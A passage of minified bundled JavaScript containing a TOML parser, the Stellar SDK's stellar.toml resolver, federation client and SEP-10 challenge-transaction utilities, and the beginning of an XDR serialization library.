                b.push(xe),
                b = xe
            } else
                Y("Cannot redefine existing key '" + he + "'.", ye, be)
        }
        function ne(fe, he, pe, ye, be) {
            var xe = []
              , Ae = "";
            he.join(".");
            for (var Ee = fe, Be = 0; Be < he.length; Be++) {
                var ce = he[Be];
                xe.push(ce),
                Ae = xe.join("."),
                typeof Ee[ce] > "u" ? Be === he.length - 1 ? Ee[ce] = pe : Ee[ce] = {} : Be !== he.length - 1 && O.indexOf(Ae) > -1 && Y("Cannot redefine existing key '" + Ae + "'.", ye, be),
                Ee = Ee[ce],
                Ee instanceof Array && Ee.length && Be < he.length - 1 && (Ee = Ee[Ee.length - 1])
            }
            return Ee
        }
        function oe(fe) {
            for (var he = null, pe = 0; pe < fe.length; pe++) {
                var ye = fe[pe];
                he === null ? he = ye.type : ye.type !== he && Y("Cannot add value of type " + ye.type + " to array of type " + he + ".", ye.line, ye.column)
            }
            return fe.map(K)
        }
        function ue(fe) {
            return fe.indexOf(".") > -1 ? '"' + fe + '"' : fe
        }
    }
    return compiler = {
        compile: _
    },
    compiler
}
var toml, hasRequiredToml;
function requireToml() {
    if (hasRequiredToml)
        return toml;
    hasRequiredToml = 1;
    var _ = requireParser()
      , M = requireCompiler();
    return toml = {
        parse: function(j) {
            var O = _.parse(j.toString());
            return M.compile(O)
        }
    },
    toml
}
var hasRequiredStellar_toml_resolver;
function requireStellar_toml_resolver() {
    return hasRequiredStellar_toml_resolver || (hasRequiredStellar_toml_resolver = 1,
    function(_) {
        Object.defineProperty(_, "__esModule", {
            value: !0
        }),
        _.StellarTomlResolver = _.STELLAR_TOML_MAX_SIZE = void 0;
        var M = require$$0$2
          , j = M.__importDefault(requireAxios())
          , O = M.__importDefault(requireToml())
          , x = requireConfig();
        _.STELLAR_TOML_MAX_SIZE = 100 * 1024;
        var w = j.default.CancelToken
          , b = function() {
            function X() {}
            return X.resolve = function(Y, F) {
                return F === void 0 && (F = {}),
                M.__awaiter(this, void 0, void 0, function() {
                    var V, K, Q;
                    return M.__generator(this, function(ee) {
                        return V = typeof F.allowHttp > "u" ? x.Config.isAllowHttp() : F.allowHttp,
                        K = typeof F.timeout > "u" ? x.Config.getTimeout() : F.timeout,
                        Q = V ? "http" : "https",
                        [2, j.default.get(Q + "://" + Y + "/.well-known/stellar.toml", {
                            maxContentLength: _.STELLAR_TOML_MAX_SIZE,
                            cancelToken: K ? new w(function(ae) {
                                return setTimeout(function() {
                                    return ae("timeout of " + K + "ms exceeded")
                                }, K)
                            }
                            ) : void 0,
                            timeout: K
                        }).then(function(ae) {
                            try {
                                var ne = O.default.parse(ae.data);
                                return Promise.resolve(ne)
                            } catch (oe) {
                                return Promise.reject(new Error("stellar.toml is invalid - Parsing error on line " + oe.line + ", column " + oe.column + ": " + oe.message))
                            }
                        }).catch(function(ae) {
                            throw ae.message.match(/^maxContentLength size/) ? new Error("stellar.toml file exceeds allowed size of " + _.STELLAR_TOML_MAX_SIZE) : ae
                        })]
                    })
                })
            }
            ,
            X
        }();
        _.StellarTomlResolver = b
    }(stellar_toml_resolver)),
    stellar_toml_resolver
}
var hasRequiredFederation_server;
function requireFederation_server() {
    return hasRequiredFederation_server || (hasRequiredFederation_server = 1,
    function(_) {
        Object.defineProperty(_, "__esModule", {
            value: !0
        }),
        _.FederationServer = _.FEDERATION_RESPONSE_MAX_SIZE = void 0;
        var M = require$$0$2
          , j = M.__importDefault(requireAxios())
          , O = requireLib$3()
          , x = M.__importDefault(requireURI())
          , w = requireConfig()
          , b = requireErrors$1()
          , X = requireStellar_toml_resolver();
        _.FEDERATION_RESPONSE_MAX_SIZE = 100 * 1024;
        var Y = function() {
            function F(V, K, Q) {
                Q === void 0 && (Q = {}),
                this.serverURL = x.default(V),
                this.domain = K;
                var ee = typeof Q.allowHttp > "u" ? w.Config.isAllowHttp() : Q.allowHttp;
                if (this.timeout = typeof Q.timeout > "u" ? w.Config.getTimeout() : Q.timeout,
                this.serverURL.protocol() !== "https" && !ee)
                    throw new Error("Cannot connect to insecure federation server")
            }
            return F.resolve = function(V, K) {
                return K === void 0 && (K = {}),
                M.__awaiter(this, void 0, void 0, function() {
                    var Q, ee, ae;
                    return M.__generator(this, function(ne) {
                        switch (ne.label) {
                        case 0:
                            return V.indexOf("*") < 0 ? O.StrKey.isValidEd25519PublicKey(V) ? [2, Promise.resolve({
                                account_id: V
                            })] : [2, Promise.reject(new Error("Invalid Account ID"))] : (Q = V.split("*"),
                            ee = Q[1],
                            Q.length !== 2 || !ee ? [2, Promise.reject(new Error("Invalid Stellar address"))] : [4, F.createForDomain(ee, K)]);
                        case 1:
                            return ae = ne.sent(),
                            [2, ae.resolveAddress(V)]
                        }
                    })
                })
            }
            ,
            F.createForDomain = function(V, K) {
                return K === void 0 && (K = {}),
                M.__awaiter(this, void 0, void 0, function() {
                    var Q;
                    return M.__generator(this, function(ee) {
                        switch (ee.label) {
                        case 0:
                            return [4, X.StellarTomlResolver.resolve(V, K)];
                        case 1:
                            return Q = ee.sent(),
                            Q.FEDERATION_SERVER ? [2, new F(Q.FEDERATION_SERVER,V,K)] : [2, Promise.reject(new Error("stellar.toml does not contain FEDERATION_SERVER field"))]
                        }
                    })
                })
            }
            ,
            F.prototype.resolveAddress = function(V) {
                return M.__awaiter(this, void 0, void 0, function() {
                    var K, Q;
                    return M.__generator(this, function(ee) {
                        if (K = V,
                        V.indexOf("*") < 0) {
                            if (!this.domain)
                                return [2, Promise.reject(new Error("Unknown domain. Make sure `address` contains a domain (ex. `bob*stellar.org`) or pass `domain` parameter when instantiating the server object."))];
                            K = V + "*" + this.domain
                        }
                        return Q = this.serverURL.query({
                            type: "name",
                            q: K
                        }),
                        [2, this._sendRequest(Q)]
                    })
                })
            }
            ,
            F.prototype.resolveAccountId = function(V) {
                return M.__awaiter(this, void 0, void 0, function() {
                    var K;
                    return M.__generator(this, function(Q) {
                        return K = this.serverURL.query({
                            type: "id",
                            q: V
                        }),
                        [2, this._sendRequest(K)]
                    })
                })
            }
            ,
            F.prototype.resolveTransactionId = function(V) {
                return M.__awaiter(this, void 0, void 0, function() {
                    var K;
                    return M.__generator(this, function(Q) {
                        return K = this.serverURL.query({
                            type: "txid",
                            q: V
                        }),
                        [2, this._sendRequest(K)]
                    })
                })
            }
            ,
            F.prototype._sendRequest = function(V) {
                return M.__awaiter(this, void 0, void 0, function() {
                    var K;
                    return M.__generator(this, function(Q) {
                        return K = this.timeout,
                        [2, j.default.get(V.toString(), {
                            maxContentLength: _.FEDERATION_RESPONSE_MAX_SIZE,
                            timeout: K
                        }).then(function(ee) {
                            if (typeof ee.data.memo < "u" && typeof ee.data.memo != "string")
                                throw new Error("memo value should be of type string");
                            return ee.data
                        }).catch(function(ee) {
                            if (ee instanceof Error) {
                                if (ee.message.match(/^maxContentLength size/))
                                    throw new Error("federation response exceeds allowed size of " + _.FEDERATION_RESPONSE_MAX_SIZE);
                                return Promise.reject(ee)
                            } else
                                return Promise.reject(new b.BadResponseError("Server query failed. Server responded: " + ee.status + " " + ee.statusText,ee.data))
                        })]
                    })
                })
            }
            ,
            F
        }();
        _.FederationServer = Y
    }(federation_server)),
    federation_server
}
var utils$2 = {}, hasRequiredUtils;
function requireUtils() {
    return hasRequiredUtils || (hasRequiredUtils = 1,
    function(_) {
        Object.defineProperty(_, "__esModule", {
            value: !0
        }),
        _.Utils = void 0;
        var M = require$$0$2
          , j = M.__importDefault(requireClone())
          , O = M.__importDefault(requireBrowser$c())
          , x = requireLib$3()
          , w = requireErrors$1();
        (function(b) {
            function X(ae, ne, oe, ue, fe, he, pe) {
                if (ue === void 0 && (ue = 300),
                pe === void 0 && (pe = null),
                ne.startsWith("M") && pe)
                    throw Error("memo cannot be used if clientAccountID is a muxed account");
                var ye = new x.Account(ae.publicKey(),"-1")
                  , be = Math.floor(Date.now() / 1e3)
                  , xe = O.default(48).toString("base64")
                  , Ae = new x.TransactionBuilder(ye,{
                    fee: x.BASE_FEE,
                    networkPassphrase: fe,
                    timebounds: {
                        minTime: be,
                        maxTime: be + ue
                    }
                }).addOperation(x.Operation.manageData({
                    name: oe + " auth",
                    value: xe,
                    source: ne,
                    withMuxing: !0
                })).addOperation(x.Operation.manageData({
                    name: "web_auth_domain",
                    value: he,
                    source: ye.accountId()
                }));
                pe && Ae.addMemo(x.Memo.id(pe));
                var Ee = Ae.build();
                return Ee.sign(ae),
                Ee.toEnvelope().toXDR("base64").toString()
            }
            b.buildChallengeTx = X;
            function Y(ae, ne, oe, ue, fe) {
                var he;
                if (ne.startsWith("M"))
                    throw Error("Invalid serverAccountID: multiplexed accounts are not supported.");
                var pe;
                try {
                    pe = new x.Transaction(ae,oe,!0)
                } catch {
                    try {
                        pe = new x.FeeBumpTransaction(ae,oe,!0)
                    } catch {
                        throw new w.InvalidSep10ChallengeError("Invalid challenge: unable to deserialize challengeTx transaction string")
                    }
                    throw new w.InvalidSep10ChallengeError("Invalid challenge: expected a Transaction but received a FeeBumpTransaction")
                }
                var ye = Number.parseInt(pe.sequence, 10);
                if (ye !== 0)
                    throw new w.InvalidSep10ChallengeError("The transaction sequence number should be zero");
                if (pe.source !== ne)
                    throw new w.InvalidSep10ChallengeError("The transaction source account is not equal to the server's account");
                if (pe.operations.length < 1)
                    throw new w.InvalidSep10ChallengeError("The transaction should contain at least one operation");
                var be = pe.operations
                  , xe = be[0]
                  , Ae = be.slice(1);
                if (!xe.source)
                    throw new w.InvalidSep10ChallengeError("The transaction's operation should contain a source account");
                var Ee = xe.source
                  , Be = null;
                if (pe.memo.type !== x.MemoNone) {
                    if (Ee.startsWith("M"))
                        throw new w.InvalidSep10ChallengeError("The transaction has a memo but the client account ID is a muxed account");
                    if (pe.memo.type !== x.MemoID)
                        throw new w.InvalidSep10ChallengeError("The transaction's memo must be of type `id`");
                    Be = pe.memo.value
                }
                if (xe.type !== "manageData")
                    throw new w.InvalidSep10ChallengeError("The transaction's operation type should be 'manageData'");
                if (pe.timeBounds && Number.parseInt((he = pe.timeBounds) === null || he === void 0 ? void 0 : he.maxTime, 10) === x.TimeoutInfinite)
                    throw new w.InvalidSep10ChallengeError("The transaction requires non-infinite timebounds");
                if (!ee(pe, 60 * 5))
                    throw new w.InvalidSep10ChallengeError("The transaction has expired");
                if (xe.value === void 0)
                    throw new w.InvalidSep10ChallengeError("The transaction's operation values should not be null");
                if (!xe.value)
                    throw new w.InvalidSep10ChallengeError("The transaction's operation value should not be null");
                if (Buffer.from(xe.value.toString(), "base64").length !== 48)
                    throw new w.InvalidSep10ChallengeError("The transaction's operation value should be a 64 bytes base64 random string");
                if (!ue)
                    throw new w.InvalidSep10ChallengeError("Invalid homeDomains: a home domain must be provided for verification");
                var ce;
                if (typeof ue == "string")
                    ue + " auth" === xe.name && (ce = ue);
                else if (Array.isArray(ue))
                    ce = ue.find(function(Z) {
                        return Z + " auth" === xe.name
                    });
                else
                    throw new w.InvalidSep10ChallengeError("Invalid homeDomains: homeDomains type is " + typeof ue + " but should be a string or an array");
                if (!ce)
                    throw new w.InvalidSep10ChallengeError("Invalid homeDomains: the transaction's operation key name does not match the expected home domain");
                for (var q = 0, L = Ae; q < L.length; q++) {
                    var U = L[q];
                    if (U.type !== "manageData")
                        throw new w.InvalidSep10ChallengeError("The transaction has operations that are not of type 'manageData'");
                    if (U.source !== ne)
                        throw new w.InvalidSep10ChallengeError("The transaction has operations that are unrecognized");
                    if (U.name === "web_auth_domain") {
                        if (U.value === void 0)
                            throw new w.InvalidSep10ChallengeError("'web_auth_domain' operation value should not be null");
                        if (U.value.compare(Buffer.from(fe)))
                            throw new w.InvalidSep10ChallengeError("'web_auth_domain' operation value does not match " + fe)
                    }
                }
                if (!K(pe, ne))
                    throw new w.InvalidSep10ChallengeError("Transaction not signed by server: '" + ne + "'");
                return {
                    tx: pe,
                    clientAccountID: Ee,
                    matchedHomeDomain: ce,
                    memo: Be
                }
            }
            b.readChallengeTx = Y;
            function F(ae, ne, oe, ue, fe, he, pe) {
                for (var ye, be = fe.map(function(L) {
                    return L.key
                }), xe = V(ae, ne, oe, be, he, pe), Ae = 0, Ee = function(L) {
                    var U = ((ye = fe.find(function(Z) {
                        return Z.key === L
                    })) === null || ye === void 0 ? void 0 : ye.weight) || 0;
                    Ae += U
                }, Be = 0, ce = xe; Be < ce.length; Be++) {
                    var q = ce[Be];
                    Ee(q)
                }
                if (Ae < ue)
                    throw new w.InvalidSep10ChallengeError("signers with weight " + Ae + " do not meet threshold " + ue + '"');
                return xe
            }
            b.verifyChallengeTxThreshold = F;
            function V(ae, ne, oe, ue, fe, he) {
                var pe = Y(ae, ne, oe, fe, he).tx, ye;
                try {
                    ye = x.Keypair.fromPublicKey(ne)
                } catch (q) {
                    throw new Error("Couldn't infer keypair from the provided 'serverAccountID': " + q.message)
                }
                for (var be = new Set, xe = 0, Ae = ue; xe < Ae.length; xe++) {
                    var Ee = Ae[xe];
                    Ee !== ye.publicKey() && Ee.charAt(0) === "G" && be.add(Ee)
                }
                if (be.size === 0)
                    throw new w.InvalidSep10ChallengeError("No verifiable client signers provided, at least one G... address must be provided");
                var Be = M.__spreadArrays([ye.publicKey()], Array.from(be))
                  , ce = Q(pe, Be);
                if (ce.indexOf(ye.publicKey()) === -1)
                    throw new w.InvalidSep10ChallengeError("Transaction not signed by server: '" + ye.publicKey() + "'");
                if (ce.length === 1)
                    throw new w.InvalidSep10ChallengeError("None of the given signers match the transaction signatures");
                if (ce.length !== pe.signatures.length)
                    throw new w.InvalidSep10ChallengeError("Transaction has unrecognized signatures");
                return ce.splice(ce.indexOf(ye.publicKey()), 1),
                ce
            }
            b.verifyChallengeTxSigners = V;
            function K(ae, ne) {
                return Q(ae, [ne]).length !== 0
            }
            b.verifyTxSignedBy = K;
            function Q(ae, ne) {
                for (var oe = ae.hash(), ue = j.default(ae.signatures), fe = new Set, he = 0, pe = ne; he < pe.length; he++) {
                    var ye = pe[he];
                    if (ue.length === 0)
                        break;
                    var be = void 0;
                    try {
                        be = x.Keypair.fromPublicKey(ye)
                    } catch (Ee) {
                        throw new w.InvalidSep10ChallengeError("Signer is not a valid address: " + Ee.message)
                    }
                    for (var xe = 0; xe < ue.length; xe++) {
                        var Ae = ue[xe];
                        if (Ae.hint().equals(be.signatureHint()) && be.verify(oe, Ae.signature())) {
                            fe.add(ye),
                            ue.splice(xe, 1);
                            break
                        }
                    }
                }
                return Array.from(fe)
            }
            b.gatherTxSigners = Q;
            function ee(ae, ne) {
                if (!ae.timeBounds)
                    return !1;
                var oe = Math.floor(Date.now() / 1e3)
                  , ue = ae.timeBounds
                  , fe = ue.minTime
                  , he = ue.maxTime;
                return oe >= Number.parseInt(fe, 10) - ne && oe <= Number.parseInt(he, 10) + ne
            }
        }
        )(_.Utils || (_.Utils = {}))
    }(utils$2)),
    utils$2
}
var hasRequiredLib$1;
function requireLib$1() {
    return hasRequiredLib$1 || (hasRequiredLib$1 = 1,
    function(_, M) {
        Object.defineProperty(M, "__esModule", {
            value: !0
        }),
        M.version = void 0;
        var j = require$$0$2;
        requireEs6Promise().polyfill();
        var O = require$$2.version;
        M.version = O,
        j.__exportStar(requireHorizon_api(), M),
        j.__exportStar(requireServer_api(), M),
        j.__exportStar(requireAccount_response(), M),
        j.__exportStar(requireErrors$1(), M);
        var x = requireConfig();
        Object.defineProperty(M, "Config", {
            enumerable: !0,
            get: function() {
                return x.Config
            }
        });
        var w = requireServer();
        Object.defineProperty(M, "Server", {
            enumerable: !0,
            get: function() {
                return w.Server
            }
        });
        var b = requireFederation_server();
        Object.defineProperty(M, "FederationServer", {
            enumerable: !0,
            get: function() {
                return b.FederationServer
            }
        }),
        Object.defineProperty(M, "FEDERATION_RESPONSE_MAX_SIZE", {
            enumerable: !0,
            get: function() {
                return b.FEDERATION_RESPONSE_MAX_SIZE
            }
        });
        var X = requireStellar_toml_resolver();
        Object.defineProperty(M, "StellarTomlResolver", {
            enumerable: !0,
            get: function() {
                return X.StellarTomlResolver
            }
        }),
        Object.defineProperty(M, "STELLAR_TOML_MAX_SIZE", {
            enumerable: !0,
            get: function() {
                return X.STELLAR_TOML_MAX_SIZE
            }
        });
        var Y = requireHorizon_axios_client();
        Object.defineProperty(M, "HorizonAxiosClient", {
            enumerable: !0,
            get: function() {
                return Y.default
            }
        }),
        Object.defineProperty(M, "SERVER_TIME_MAP", {
            enumerable: !0,
            get: function() {
                return Y.SERVER_TIME_MAP
            }
        }),
        Object.defineProperty(M, "getCurrentServerTime", {
            enumerable: !0,
            get: function() {
                return Y.getCurrentServerTime
            }
        }),
        j.__exportStar(requireUtils(), M),
        j.__exportStar(requireLib$3(), M),
        M.default = _.exports
    }(lib$4, lib$4.exports)),
    lib$4.exports
}
var libExports$1 = requireLib$1()
  , lib = {
    exports: {}
}
  , xdr$2 = {}
  , curr_generated = {}
  , xdr$1 = {
    exports: {}
};
/*! For license information please see xdr.js.LICENSE.txt */
var xdr = xdr$1.exports, hasRequiredXdr$1;
function requireXdr$1() {
    return hasRequiredXdr$1 || (hasRequiredXdr$1 = 1,
    function(_, M) {
        (function(j, O) {
            _.exports = O()
        }
        )(xdr, () => ( () => {
            var j = {
                616: (w, b, X) => {
                    X.d(b, {
                        A: () => F
                    });
                    var Y = X(287);
                    Y.hp.alloc(1).subarray(0, 1)instanceof Y.hp || (Y.hp.prototype.subarray = function(V, K) {
                        const Q = Uint8Array.prototype.subarray.call(this, V, K);
                        return Object.setPrototypeOf(Q, Y.hp.prototype),
                        Q
                    }
                    );
                    const F = Y.hp
                }
                ,
                281: (w, b, X) => {
                    const Y = X(164);
                    w.exports = Y
                }
                ,
                164: (w, b, X) => {
                    X.r(b),
                    X.d(b, {
                        Array: () => $e,
                        Bool: () => ge,
                        Double: () => ie,
                        Enum: () => lt,
                        Float: () => $,
                        Hyper: () => te,
                        Int: () => q,
                        LargeInt: () => Z,
                        Opaque: () => Te,
                        Option: () => qe,
                        Quadruple: () => ve,
                        Reference: () => nt,
                        String: () => Pe,
                        Struct: () => je,
                        Union: () => Qe,
                        UnsignedHyper: () => re,
                        UnsignedInt: () => de,
                        VarArray: () => Ne,
                        VarOpaque: () => Ze,
                        Void: () => Ve,
                        XdrReader: () => ee,
                        XdrWriter: () => oe,
                        config: () => et
                    });
                    class Y extends TypeError {
                        constructor(He) {
                            super(`XDR Write Error: ${He}`)
                        }
                    }
                    class F extends TypeError {
                        constructor(He) {
                            super(`XDR Read Error: ${He}`)
                        }
                    }
                    class V extends TypeError {
                        constructor(He) {
                            super(`XDR Type Definition Error: ${He}`)
                        }
                    }
                    class K extends V {
                        constructor() {
                            super("method not implemented, it should be overloaded in the descendant class.")
                        }
                    }
                    var Q = X(616).A;
                    class ee {
                        constructor(He) {
                            vi(this, "_buffer");
                            vi(this, "_length");
                            vi(this, "_index");
                            if (!Q.isBuffer(He)) {
                                if (!(He instanceof Array || Array.isArray(He) || ArrayBuffer.isView(He)))
                                    throw new F(`source invalid: ${He}`);
                                He = Q.from(He)
                            }
                            this._buffer = He,
                            this._length = He.length,
                            this._index = 0
                        }
                        get eof() {
                            return this._index === this._length
                        }
                        advance(He) {
                            const ke = this._index;
                            if (this._index += He,
                            this._length < this._index)
                                throw new F("attempt to read outside the boundary of the buffer");
                            const Me = 4 - (He % 4 || 4);
                            if (Me > 0) {
                                for (let Ue = 0; Ue < Me; Ue++)
                                    if (this._buffer[this._index + Ue] !== 0)
                                        throw new F("invalid padding");
                                this._index += Me
                            }
                            return ke
                        }
                        rewind() {
                            this._index = 0
                        }
                        read(He) {
                            const ke = this.advance(He);
                            return this._buffer.subarray(ke, ke + He)
                        }
                        readInt32BE() {
                            return this._buffer.readInt32BE(this.advance(4))
                        }
                        readUInt32BE() {
                            return this._buffer.readUInt32BE(this.advance(4))
                        }
                        readBigInt64BE() {
                            return this._buffer.readBigInt64BE(this.advance(8))
                        }
                        readBigUInt64BE() {
                            return this._buffer.readBigUInt64BE(this.advance(8))
                        }
                        readFloatBE() {
                            return this._buffer.readFloatBE(this.advance(4))
                        }
                        readDoubleBE() {
                            return this._buffer.readDoubleBE(this.advance(8))
                        }
                        ensureInputConsumed() {
                            if (this._index !== this._length)
                                throw new F("invalid XDR contract typecast - source buffer not entirely consumed")
                        }
                    }
                    var ae = X(616).A;
                    const ne = 8192;
                    class oe {
                        constructor(He) {
                            vi(this, "_buffer");
                            vi(this, "_length");
                            vi(this, "_index", 0);
                            typeof He == "number" ? He = ae.allocUnsafe(He) : He instanceof ae || (He = ae.allocUnsafe(ne)),
                            this._buffer = He,
                            this._length = He.length
                        }
                        alloc(He) {
                            const ke = this._index;
                            return this._index += He,
                            this._length < this._index && this.resize(this._index),
                            ke
                        }
                        resize(He) {
                            const ke = Math.ceil(He / ne) * ne
                              , Me = ae.allocUnsafe(ke);
                            this._buffer.copy(Me, 0, 0, this._length),
                            this._buffer = Me,
                            this._length = ke
                        }
                        finalize() {
                            return this._buffer.subarray(0, this._index)
                        }
                        toArray() {
                            return [...this.finalize()]
                        }
                        write(He, ke) {
                            if (typeof He == "string") {
                                const Ue = this.alloc(ke);
                                this._buffer.write(He, Ue, "utf8")
                            } else {
                                He instanceof ae || (He = ae.from(He));
                                const Ue = this.alloc(ke);
                                He.copy(this._buffer, Ue, 0, ke)
                            }
                            const Me = 4 - (ke % 4 || 4);
                            if (Me > 0) {
                                const Ue = this.alloc(Me);
                                this._buffer.fill(0, Ue, this._index)
                            }
                        }
                        writeInt32BE(He) {
                            const ke = this.alloc(4);
                            this._buffer.writeInt32BE(He, ke)
                        }
                        writeUInt32BE(He) {
                            const ke = this.alloc(4);
                            this._buffer.writeUInt32BE(He, ke)
                        }
                        writeBigInt64BE(He) {
                            const ke = this.alloc(8);
                            this._buffer.writeBigInt64BE(He, ke)
                        }
                        writeBigUInt64BE(He) {
                            const ke = this.alloc(8);
                            this._buffer.writeBigUInt64BE(He, ke)
                        }
                        writeFloatBE(He) {
                            const ke = this.alloc(4);
                            this._buffer.writeFloatBE(He, ke)
                        }
                        writeDoubleBE(He) {
                            const ke = this.alloc(8);
                            this._buffer.writeDoubleBE(He, ke)
                        }
                    }
                    vi(oe, "bufferChunkSize", ne);
                    var ue = X(616).A;
                    class fe {
                        toXDR(He="raw") {
                            if (!this.write)
                                return this.constructor.toXDR(this, He);
                            const ke = new oe;
                            return this.write(this, ke),
                            be(ke.finalize(), He)
                        }
                        fromXDR(He, ke="raw") {
                            if (!this.read)
                                return this.constructor.fromXDR(He, ke);
                            const Me = new ee(xe(He, ke))
                              , Ue = this.read(Me);
                            return Me.ensureInputConsumed(),
                            Ue
                        }
                        validateXDR(He, ke="raw") {
                            try {
                                return this.fromXDR(He, ke),
                                !0
                            } catch {
                                return !1
                            }
                        }
                        static toXDR(He, ke="raw") {
                            const Me = new oe;
                            return this.write(He, Me),
                            be(Me.finalize(), ke)
                        }
                        static fromXDR(He, ke="raw") {
                            const Me = new ee(xe(He, ke))
                              , Ue = this.read(Me);
                            return Me.ensureInputConsumed(),
                            Ue
                        }
                        static validateXDR(He, ke="raw") {
                            try {
                                return this.fromXDR(He, ke),
                                !0
                            } catch {
                                return !1
                            }
                        }
                    }
                    class he extends fe {
                        static read(He) {
                            throw new K
                        }
                        static write(He, ke) {
                            throw new K
                        }
                        static isValid(He) {
                            return !1
                        }
                    }
                    class pe extends fe {
                        isValid(He) {
                            return !1
                        }
                    }
                    class ye extends TypeError {
                        constructor(He) {
                            super(`Invalid format ${He}, must be one of "raw", "hex", "base64"`)
                        }
                    }
                    function be(tt, He) {
                        switch (He) {
                        case "raw":
                            return tt;
                        case "hex":
                            return tt.toString("hex");
                        case "base64":
                            return tt.toString("base64");
                        default:
                            throw new ye(He)
                        }
                    }
                    function xe(tt, He) {
                        switch (He) {
                        case "raw":
                            return tt;
                        case "hex":
                            return ue.from(tt, "hex");
                        case "base64":
                            return ue.from(tt, "base64");
                        default:
                            throw new ye(He)
                        }
                    }
                    function Ae(tt, He) {
                        return tt != null && (tt instanceof He || Ee(tt, He) && typeof tt.constructor.read == "function" && typeof tt.constructor.write == "function" && Ee(tt, "XdrType"))
                    }
                    function Ee(tt, He) {
                        do
                            if (tt.constructor.name === He)
                                return !0;
                        while (tt = Object.getPrototypeOf(tt));
                        return !1
                    }
                    const Be = 2147483647
                      , ce = -2147483648;
                    class q extends he {
                        static read(He) {
                            return He.readInt32BE()
                        }
                        static write(He, ke) {
                            if (typeof He != "number")
                                throw new Y("not a number");
                            if ((0 | He) !== He)
                                throw new Y("invalid i32 value");
                            ke.writeInt32BE(He)
                        }
                        static isValid(He) {
                            return typeof He == "number" && (0 | He) === He && He >= ce && He <= Be
                        }
                    }
                    function L(tt, He, ke) {
                        if (typeof tt != "bigint")
                            throw new TypeError("Expected bigint 'value', got " + typeof tt);
                        const Me = He / ke;
                        if (Me === 1)
                            return [tt];
                        if (ke < 32 || ke > 128 || Me !== 2 && Me !== 4 && Me !== 8)
                            throw new TypeError(`invalid bigint (${tt}) and slice size (${He} -> ${ke}) combination`);
                        const Ue = BigInt(ke)
                          , rt = new Array(Me);
                        for (let dt = 0; dt < Me; dt++)
                            rt[dt] = BigInt.asIntN(ke, tt),
                            tt >>= Ue;
                        return rt
                    }
                    function U(tt, He) {
                        if (He)
                            return [0n, (1n << BigInt(tt)) - 1n];
                        const ke = 1n << BigInt(tt - 1);
                        return [0n - ke, ke - 1n]
                    }
                    q.MAX_VALUE = Be,
                    q.MIN_VALUE = 2147483648;
                    class Z extends he {
                        constructor(He) {
                            super(),
                            this._value = function(ke, Me, Ue) {
                                ke instanceof Array ? ke.length && ke[0]instanceof Array && (ke = ke[0]) : ke = [ke];
                                const rt = Me / ke.length;
                                switch (rt) {
                                case 32:
                                case 64:
                                case 128:
                                case 256:
                                    break;
                                default:
                                    throw new RangeError(`expected slices to fit in 32/64/128/256 bits, got ${ke}`)
                                }
                                try {
                                    for (let gt = 0; gt < ke.length; gt++)
                                        typeof ke[gt] != "bigint" && (ke[gt] = BigInt(ke[gt].valueOf()))
                                } catch (gt) {
                                    throw new TypeError(`expected bigint-like values, got: ${ke} (${gt})`)
                                }
                                if (Ue && ke.length === 1 && ke[0] < 0n)
                                    throw new RangeError(`expected a positive value, got: ${ke}`);
                                let dt = BigInt.asUintN(rt, ke[0]);
                                for (let gt = 1; gt < ke.length; gt++)
                                    dt |= BigInt.asUintN(rt, ke[gt]) << BigInt(gt * rt);
                                Ue || (dt = BigInt.asIntN(Me, dt));
                                const [Et,ft] = U(Me, Ue);
                                if (dt >= Et && dt <= ft)
                                    return dt;
                                throw new TypeError(`bigint values [${ke}] for ${function(gt, Yt) {
                                    return `${Yt ? "u" : "i"}${gt}`
                                }(Me, Ue)} out of range [${Et}, ${ft}]: ${dt}`)
                            }(He, this.size, this.unsigned)
                        }
                        get unsigned() {
                            throw new K
                        }
                        get size() {
                            throw new K
                        }
                        slice(He) {
                            return L(this._value, this.size, He)
                        }
                        toString() {
                            return this._value.toString()
                        }
                        toJSON() {
                            return {
                                _value: this._value.toString()
                            }
                        }
                        toBigInt() {
                            return BigInt(this._value)
                        }
                        static read(He) {
                            const {size: ke} = this.prototype;
                            return ke === 64 ? new this(He.readBigUInt64BE()) : new this(...Array.from({
                                length: ke / 64
                            }, () => He.readBigUInt64BE()).reverse())
                        }
                        static write(He, ke) {
                            if (He instanceof this)
                                He = He._value;
                            else if (typeof He != "bigint" || He > this.MAX_VALUE || He < this.MIN_VALUE)
                                throw new Y(`${He} is not a ${this.name}`);
                            const {unsigned: Me, size: Ue} = this.prototype;
                            if (Ue === 64)
                                Me ? ke.writeBigUInt64BE(He) : ke.writeBigInt64BE(He);
                            else
                                for (const rt of L(He, Ue, 64).reverse())
                                    Me ? ke.writeBigUInt64BE(rt) : ke.writeBigInt64BE(rt)
                        }
                        static isValid(He) {
                            return typeof He == "bigint" || He instanceof this
                        }
                        static fromString(He) {
                            return new this(He)
                        }
                        static defineIntBoundaries() {
                            const [He,ke] = U(this.prototype.size, this.prototype.unsigned);
                            this.MIN_VALUE = He,
                            this.MAX_VALUE = ke
                        }
                    }
                    vi(Z, "MAX_VALUE", 0n),
                    vi(Z, "MIN_VALUE", 0n);
                    class te extends Z {
                        constructor(...He) {
                            super(He)
                        }
                        get low() {
                            return Number(0xffffffffn & this._value) | 0
                        }
                        get high() {
                            return Number(this._value >> 32n) | 0
                        }
                        get size() {
                            return 64
                        }
                        get unsigned() {
                            return !1
                        }
                        static fromBits(He, ke) {
                            return new this(He,ke)
                        }
                    }
                    te.defineIntBoundaries();
                    const se = 4294967295;
                    class de extends he {
                        static read(He) {
                            return He.readUInt32BE()
                        }
                        static write(He, ke) {
                            if (typeof He != "number" || !(He >= 0 && He <= se) || He % 1 != 0)
                                throw new Y("invalid u32 value");
                            ke.writeUInt32BE(He)
                        }
                        static isValid(He) {
                            return typeof He == "number" && He % 1 == 0 && He >= 0 && He <= se
                        }
                    }
                    de.MAX_VALUE = se,
                    de.MIN_VALUE = 0;
                    class re extends Z {
                        constructor(...He) {
                            super(He)
                        }
                        get low() {
                            return Number(0xffffffffn & this._value) | 0
                        }
                        get high() {
                            return Number(this._value >> 32n) | 0
                        }
                        get size() {
                            return 64
                        }
                        get unsigned() {
                            return !0
                        }
                        static fromBits(He, ke) {
                            return new this(He,ke)
                        }
                    }
                    re.defineIntBoundaries();
                    class $ extends he {
                        static read(He) {
                            return He.readFloatBE()
                        }
                        static write(He, ke) {
                            if (typeof He != "number")
                                throw new Y("not a number");
                            ke.writeFloatBE(He)
                        }
                        static isValid(He) {
                            return typeof He == "number"
                        }
                    }
                    class ie extends he {
                        static read(He) {
                            return He.readDoubleBE()
                        }
                        static write(He, ke) {
                            if (typeof He != "number")
                                throw new Y("not a number");
                            ke.writeDoubleBE(He)
                        }
